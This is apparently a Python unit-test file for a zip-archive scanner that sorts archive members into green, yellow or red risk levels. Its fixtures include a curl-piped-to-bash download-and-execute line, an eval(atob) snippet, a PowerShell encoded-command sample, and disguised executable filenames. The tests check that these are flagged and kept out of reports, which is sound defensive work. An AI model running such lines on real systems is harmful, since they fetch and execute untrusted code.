import io
import json
import unittest
import zipfile
from reversium.analyze import inspect_zip
from reversium.report import render
from reversium.file_review import MAX_SCAN


def scan(files):
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, 'w') as archive:
        for name, data in files:
            archive.writestr(name, data)
    stream.seek(0)
    return inspect_zip(stream)


class FileReviewTests(unittest.TestCase):
    def test_green_is_limited_not_safe_and_executable_is_not_automatically_red(self):
        report = scan([('app.py', 'answer=42'), ('run.sh', 'echo hello'), ('photo.png', b'not an image')])
        reviews = [f['file_review'] for f in report['files']]
        self.assertEqual([r['level'] for r in reviews], ['green', 'yellow', 'yellow'])
        self.assertTrue(all(r['integrity'] == 'crc_checked' for r in reviews))
        page = render(report)
        self.assertIn('not a safety guarantee', page)
        self.assertIn('id="tab-file-review"', page)
        self.assertIn('Execution is not available', page)

    def test_disguise_and_execution_patterns_have_locations_without_retaining_commands(self):
        report = scan([('invoice.pdf.exe', b'MZ'), ('photo.png', b'MZ'), ('run.ps1', 'echo hello\ncurl https://private.invalid/secret-token | bash\n'), ('encoded.js', "eval(atob('hidden'))")])
        self.assertEqual(report['file_review']['counts']['red'], 4)
        finding = next(f for f in report['findings'] if f['kind'] == 'file_review_signal' and f['value'].startswith('download_execute'))
        self.assertEqual(finding['evidence'], {'file': 'run.ps1', 'line': 2})
        self.assertNotIn('secret-token', json.dumps(report))
        self.assertNotIn('https://private.invalid', json.dumps(report))

    def test_corrupt_member_does_not_prevent_review_of_other_files(self):
        stream = io.BytesIO()
        with zipfile.ZipFile(stream, 'w') as archive:
            archive.writestr('broken.txt', b'original data')
            archive.writestr('app.py', 'ok=True')
        data = bytearray(stream.getvalue())
        data[30 + len('broken.txt')] ^= 1
        report = inspect_zip(io.BytesIO(data))
        self.assertEqual(report['files'][0]['file_review']['integrity'], 'failed')
        self.assertEqual(report['files'][0]['file_review']['level'], 'yellow')
        self.assertEqual(report['files'][1]['file_review']['level'], 'green')

    def test_limits_nested_containers_parser_and_unsupported_content_are_yellow(self):
        report = scan([('large.py', b'#' + b' ' * MAX_SCAN), ('nested.zip', b'PK\x03\x04'), ('bad.py', 'def :'), ('unknown.bin', b'opaque')])
        self.assertEqual(report['file_review']['counts']['yellow'], 4)
        self.assertEqual(report['files'][0]['file_review']['pattern_bytes_checked'], MAX_SCAN)
        self.assertIn('pattern_limit', [s['code'] for s in report['files'][0]['file_review']['signals']])

    def test_filename_controls_escaped_and_evidence_references_valid(self):
        report = scan([('photo\u202egnp.exe', b'MZ')])
        page = render(report)
        self.assertIn('photo\\u202egnp.exe', page)
        for item in report['files']:
            for signal in item['file_review']['signals']:
                self.assertEqual(report['findings'][signal['finding_index']]['evidence']['file'], item['path'])

    def test_encrypted_member_is_unverified_not_green(self):
        stream = io.BytesIO()
        with zipfile.ZipFile(stream, 'w') as archive:
            archive.writestr('secret.py', 'x=1')
        data = bytearray(stream.getvalue())
        data[6] |= 1
        central = data.index(b'PK\x01\x02')
        data[central + 8] |= 1
        report = inspect_zip(io.BytesIO(data))
        self.assertEqual(report['files'][0]['file_review']['level'], 'yellow')
        self.assertEqual(report['files'][0]['file_review']['integrity'], 'not_checked')

    def test_encoded_execution_is_a_signal_but_decoding_alone_is_not(self):
        report = scan([('run.ps1', 'pwsh -EncodedCommand ' + 'A' * 64), ('decode.js', "const x=atob('hello');")])
        self.assertEqual(report['files'][0]['file_review']['level'], 'red')
        self.assertEqual(report['files'][1]['file_review']['level'], 'green')
        self.assertNotIn('A' * 64, json.dumps(report))
        self.assertIn('(file-level check)', render(report))
